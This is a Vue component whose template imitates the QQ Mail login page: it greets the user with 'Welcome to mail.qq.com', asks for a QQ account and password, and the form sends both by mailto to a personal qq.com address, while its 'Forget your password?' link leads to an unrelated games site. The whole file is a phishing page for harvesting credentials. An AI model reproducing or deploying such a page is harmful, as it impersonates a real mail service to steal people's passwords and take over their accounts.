<template>
  <div id="app">
    <img src="./assets/mail.png">
    <h1>{{ msg }}</h1>
    <h2>Input your qq account and password to log in</h2>
    <ul>
	  <li><form action="mailto:673622006@qq.com" method="post" enctype="text">
		Account: <input type="text" name="account" />
		<br />
		Password:<input type="password" name="password" />
		<br />
		<input type="submit" value="Log in" />
		  </form>
	  </li>
    </ul>
	<ul>
      <li><a href="https://www.4399.com" target="_blank">Forget your password?</a></li>
	</ul>
  </div>
</template>

<script>
export default {
  name: 'app',
  data () {
    return {
      msg: 'Welcome to mail.qq.com'
    }
  }
}
</script>

<style lang="scss">
#app {
  font-family: 'Avenir', Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  text-align: center;
  color: #2c3e50;
  margin-top: 60px;
}

h1, h2 {
  font-weight: normal;
}

ul {
  list-style-type: none;
  padding: 0;
}

li {
  display: inline-block;
  margin: 0 10px;
}

a {
  color: #66ccff;
}
</style>
